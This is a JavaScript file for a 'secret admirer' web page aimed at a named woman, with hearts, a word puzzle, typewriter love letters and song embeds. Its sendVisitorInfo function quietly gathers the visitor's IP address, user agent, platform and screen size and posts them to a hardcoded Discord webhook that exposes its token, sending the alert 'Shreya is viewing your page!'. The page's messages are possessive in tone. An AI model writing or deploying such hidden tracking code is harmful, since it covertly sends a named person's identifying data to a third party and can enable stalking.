async function sendVisitorInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();

        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            windowSize: `${window.innerWidth}x${window.innerHeight}`
        };

        const message = {
            content: "🔔 Shreya is viewing your page!",
            embeds: [{
                title: "Shreya's Device Info",
                color: 0xff3366,
                fields: [
                    {
                        name: "IP Address",
                        value: ipData.ip,
                        inline: true
                    },
                    {
                        name: "Device Info",
                        value: `Platform: ${deviceInfo.platform}\nBrowser: ${deviceInfo.vendor}`,
                        inline: true
                    },
                    {
                        name: "Screen",
                        value: deviceInfo.screenResolution,
                        inline: true
                    },
                    {
                        name: "User Agent",
                        value: deviceInfo.userAgent
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        await fetch('https://discord.com/api/webhooks/1310805850147000373/nMozf_cjp2zaUMQC6trIw7jmjUoOeoUSfdLjifXZiw7SBb4tXLPW3AurE_WHL4sVgy7p', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });
    } catch (error) {
        console.error('Error sending visitor information:', error);
    }
}

document.addEventListener('DOMContentLoaded', function () {
    function createHeart() {
        const heart = document.createElement('div');
        heart.classList.add('heart');
        heart.innerHTML = '💖';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.fontSize = (Math.random() * 20 + 10) + 'px';
        document.getElementById('heartsContainer').appendChild(heart);
        setTimeout(() => heart.remove(), 4000);
    }

    setInterval(createHeart, 300);

    const puzzleWord = "FRIENDSHIP";
    const puzzle = document.getElementById('puzzle');
    let revealedLetters = new Set();

    window.revealNext = function (section) {
        const nextSection = document.getElementById(`section${section}`);
        nextSection.style.display = 'block';
        setTimeout(() => {
            nextSection.scrollIntoView({ behavior: 'smooth' });
        }, 500);

        if (section === 1) {
            setupPuzzle();
        }
    };

    function revealLetter(div, index) {
        div.textContent = div.dataset.letter;
        div.style.background = 'linear-gradient(45deg, #4CAF50, #45e9a6)';
        div.style.transform = 'scale(1.1) rotate(360deg)';
        div.style.transition = 'all 0.5s ease';
        revealedLetters.add(index);

        if (revealedLetters.size === puzzleWord.length) {
            celebratePuzzleCompletion();
            setTimeout(() => {
                revealNext(2);
            }, 2000);
        }
    }

    function celebratePuzzleCompletion() {
        const celebration = document.createElement('div');
        celebration.classList.add('puzzle-celebration');
        const emojis = ['🎉', '💝', '✨', '🌟', '💫', '💖', '🎈', '🌸', '💕', '🎊'];
        for (let i = 0; i < 30; i++) {
            const span = document.createElement('span');
            span.classList.add('celebration-emoji');
            span.textContent = emojis[Math.floor(Math.random() * emojis.length)];
            span.style.left = `${Math.random() * 100}%`;
            span.style.animationDelay = `${Math.random() * 2}s`;
            celebration.appendChild(span);
        }
        document.body.appendChild(celebration);
        setTimeout(() => celebration.remove(), 4000);
    }

    function setupPuzzle() {
        puzzle.innerHTML = '';
        const decorHeader = document.createElement('div');
        decorHeader.innerHTML = `
            <div class="polaroid" style="margin-bottom: 30px;">
                <img src="https://i.ibb.co/jbZtzMC/pexels-hakan-hu-1301084-2480524.jpg" alt="Friendship" style="width: 100%; height: 200px; object-fit: cover;">
                <p style="margin-top: 10px; font-size: 1.2em;">Let's solve this together! 💫</p>
            </div>
        `;
        puzzle.parentElement.insertBefore(decorHeader, puzzle);

        puzzleWord.split('').forEach((letter, index) => {
            const div = document.createElement('div');
            div.classList.add('puzzle-letter');
            div.textContent = '?';
            div.dataset.letter = letter;
            div.style.animation = `slideIn 0.5s ${index * 0.1}s forwards`;
            div.onclick = () => revealLetter(div, index);
            puzzle.appendChild(div);
        });

        const hintSection = document.createElement('div');
        hintSection.innerHTML = `
            <div class="message-box" style="margin-top: 30px; text-align: center;">
                <p style="font-size: 1.1em;">💭 Hint: It's something precious that grows stronger with time...</p>
                <div style="margin-top: 15px;">
                    <span style="font-size: 24px;">🤝 💖 🌟</span>
                </div>
            </div>
        `;
        puzzle.parentElement.appendChild(hintSection);
    }

    const specialMessage = `Hey Shreya! 💖

Every time I see your name, it brings a smile to my face. There’s something about your presence—even through a screen—that makes everything better.

Honestly, I’ve been meaning to say this... You’re beautiful. Not just your smile, but your energy, your vibe, your laugh—it’s magnetic.

If I could steal a moment with you, just us, I’d want it to be under the stars, sharing stories and silly jokes. Or maybe just vibing to your favorite playlist.

I want us go grow together, be with you every moment even when youre sad or not feeling well , even with your moods swings and period anger i want you always and forever?
❣️

I just really want to know you better—because every message with you feels like magic.

From someone who's already enchanted,
Your Secret Admirer`;

    const nextMessage = `Shreya, you’re mine 🥺 That makes me the luckiest man alive. ☺️

You’ve got this effortless charm that makes the ordinary feel special. I don’t know if you realize how much joy you bring to someone like me just by being... you.

It’s not just a little crush. It’s the way you brighten my day without trying. It’s the way your smile plays on my mind long after I’ve seen it.

So here I am—leaving a little piece of my heart on this screen, soon I'll be there with you so that  I can give you the rest in person.`;

    function typeWriterEffect(message, callback) {
        const messageBox = document.getElementById('specialMessage');
        messageBox.innerHTML = '';
        let i = 0;
        function typeWriter() {
            if (i < message.length) {
                messageBox.innerHTML += message.charAt(i);
                i++;
                setTimeout(typeWriter, 50);
            } else {
                callback();
            }
        }
        typeWriter();
    }

    window.showSpecialMessage = function () {
        const messageContainer = document.getElementById('messageContainer');
        messageContainer.style.display = 'block';
        typeWriterEffect(specialMessage, function () {
            const clickableText = document.createElement('span');
            clickableText.className = 'clickable-text';
            clickableText.innerHTML = 'Shreya click here for something more... ✨';
            clickableText.onclick = showNextMessage;
            document.getElementById('specialMessage').appendChild(clickableText);
        });
    };

    window.showNextMessage = function () {
        const messageBox = document.getElementById('specialMessage');
        typeWriterEffect(nextMessage, function () { });
    };

    async function searchSong(query) {
        const songResult = document.getElementById('songResult');
        songResult.innerHTML = `<div class="message-box">Searching... 🎵</div>`;
        const formattedQuery = encodeURIComponent(query);
        const spotifyEmbed = `
            <div class="message-box">
                <iframe style="border-radius:12px" 
                    src="https://open.spotify.com/embed/search/${formattedQuery}" 
                    width="100%" 
                    height="352" 
                    frameBorder="0" 
                    allowfullscreen="" 
                    allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" 
                    loading="lazy">
                </iframe>
            </div>
        `;
        songResult.innerHTML = spotifyEmbed;
    }

    function setupSongSearch() {
        const songInput = document.getElementById('songInput');
        if (songInput) {
            songInput.addEventListener('keyup', function (event) {
                if (event.key === 'Enter') {
                    searchSong(this.value);
                }
            });

            const searchButton = document.createElement('button');
            searchButton.className = 'choice-btn';
            searchButton.style.marginLeft = '10px';
            searchButton.innerHTML = 'Search 🎵';
            searchButton.onclick = () => searchSong(songInput.value);
            songInput.parentNode.appendChild(searchButton);
        }
    }

    document.addEventListener('DOMContentLoaded', setupSongSearch);

    function confirmAndPlay(videoId, isConfirmed) {
        const playerContainer = document.getElementById('playerContainer');
        const youtubePlayer = document.getElementById('youtubePlayer');

        if (isConfirmed) {
            playerContainer.style.display = 'block';
            youtubePlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=1&controls=1&showinfo=0&rel=0`;
            document.querySelector('.choice-container').style.display = 'none';
        } else {
            document.getElementById('songInput').value = '';
            document.getElementById('songInput').focus();
            document.getElementById('songResult').innerHTML = `
                <div class="message-box">
                    <p>No problem! Try searching for another song 🎵</p>
                </div>
            `;
        }
    }

    window.confirmAndPlay = confirmAndPlay;
    window.searchSong = searchSong;
});
